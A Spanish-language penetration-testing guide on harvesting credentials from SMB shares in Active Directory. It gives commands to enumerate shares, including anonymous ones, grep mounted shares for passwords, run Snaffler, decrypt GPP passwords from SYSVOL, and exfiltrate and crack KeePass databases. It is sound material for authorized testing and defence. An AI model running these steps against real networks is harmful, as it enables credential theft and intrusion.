# Búsqueda de Credenciales en Recursos Compartidos de Red

Los shares SMB en entornos corporativos acumulan décadas de scripts, configuraciones, backups y documentación. Es frecuente encontrar contraseñas hardcodeadas en scripts de automatización, archivos de configuración y hojas de cálculo que los administradores dejaron en carpetas compartidas. En muchos engagements internos, esta búsqueda da acceso a credenciales críticas sin explotar ninguna vulnerabilidad técnica.

### Enumeración de shares accesibles

```bash
# NetExec — listar shares con credenciales de usuario de dominio
netexec smb 192.168.1.0/24 -u usuario -p Password123 --shares

# Impacket — listar shares
impacket-smbclient DOMINIO/usuario:Password123@192.168.1.10
# Dentro del cliente: shares / ls / get archivo

# smbclient directo
smbclient -L //192.168.1.10 -U usuario%Password123
smbclient //192.168.1.10/NETLOGON -U usuario%Password123
```

### Montar shares para búsqueda masiva

```bash
# Montar share en Linux
sudo mount -t cifs //192.168.1.10/Compartido /mnt/share -o username=usuario,password=Password123,domain=EMPRESA

# Buscar ficheros con credenciales en el share montado
grep -r "password\|passwd\|secret\|token\|api_key" /mnt/share/ 2>/dev/null \
  --include="*.txt" --include="*.xml" --include="*.ini" \
  --include="*.conf" --include="*.ps1" --include="*.bat" \
  --include="*.csv" --include="*.xlsx" -l
```

### Snaffler — búsqueda automatizada en shares AD

Snaffler es la herramienta más completa para escanear shares en entornos Active Directory. Enumera todos los shares accesibles en el dominio y busca patrones de credenciales, claves, certificados y otros secretos:

```cmd
# Desde Windows (host unido al dominio)
Snaffler.exe -s -d dominio.local -o snaffler.log -v data

# Filtrando por servidor específico
Snaffler.exe -s -n dc01.dominio.local -o snaffler.log
```

Snaffler clasifica los hallazgos por severidad (Red, Yellow, Green) y detecta automáticamente:

* Contraseñas en scripts `.ps1`, `.bat`, `.cmd`
* Cadenas de conexión en `web.config`, `*.config`
* Archivos KeePass (`.kdbx`)
* Claves privadas SSH y certificados PFX
* Hashes en archivos de configuración
* GPP passwords en SYSVOL

### SYSVOL y NETLOGON

Los shares `SYSVOL` y `NETLOGON` son accesibles por defecto para cualquier usuario autenticado del dominio y contienen scripts de inicio de sesión y políticas de grupo:

```bash
# Acceder a SYSVOL
smbclient //dc01.dominio.local/SYSVOL -U usuario%Password123
impacket-smbclient DOMINIO/usuario:Password123@dc01.dominio.local

# Buscar GPP passwords (archivos Groups.xml, Services.xml, etc.)
find /mnt/sysvol -name "Groups.xml" -o -name "Services.xml" \
  -o -name "Scheduledtasks.xml" -o -name "Printers.xml" 2>/dev/null

# El campo cpassword en estos XML es AES-256 con clave pública de MS
# Descifrar con gpp-decrypt
gpp-decrypt "cpassword_value"

# O con NetExec automáticamente
netexec smb dc01.dominio.local -u usuario -p Password123 -M gpp_password
```

### Shares con acceso anónimo

```bash
# Comprobar shares accesibles sin credenciales
netexec smb 192.168.1.0/24 -u '' -p '' --shares
smbclient -L //192.168.1.10 -N
smbclient //192.168.1.10/Publico -N
```

Los shares anónimos (`Everyone: Read`) son una misconfiguration frecuente en entornos corporativos que nunca revisaron los permisos del almacenamiento de ficheros.

### Tipos de archivos de mayor interés

| Extensión                     | Contenido potencial                          |
| ----------------------------- | -------------------------------------------- |
| `.ps1`, `.bat`, `.cmd`        | Scripts con credenciales hardcodeadas        |
| `.xml`, `.config`             | Configuraciones de aplicaciones y IIS        |
| `.ini`, `.conf`               | Configuraciones de servicios                 |
| `.kdbx`                       | Base de datos KeePass                        |
| `.pfx`, `.p12`                | Certificados con clave privada               |
| `.pem`, `.key`                | Claves privadas SSH/TLS                      |
| `.xls`, `.xlsx`, `.csv`       | Inventarios de contraseñas o activos         |
| `id_rsa`, `*.ppk`             | Claves SSH (PuTTY)                           |
| `.vhd`, `.vmdk`               | Imágenes de disco — pueden contener SAM/NTDS |
| `unattend.xml`, `sysprep.xml` | Contraseñas de despliegue                    |

> En muchos entornos, el share `\\DC\SYSVOL` tiene scripts `.bat` de inicio de sesión creados hace años que contienen `net use Z: \\servidor\recurso /user:DOMINIO\svcaccount Password123`. Ese tipo de credenciales de service accounts raramente se rotan.

> Los archivos `.kdbx` encontrados en shares son objetivos de altísimo valor. Los gestores de contraseñas de administradores pueden contener las credenciales de todos los sistemas críticos de la organización. Exfiltrar y crackear con `keepass2john` + hashcat.
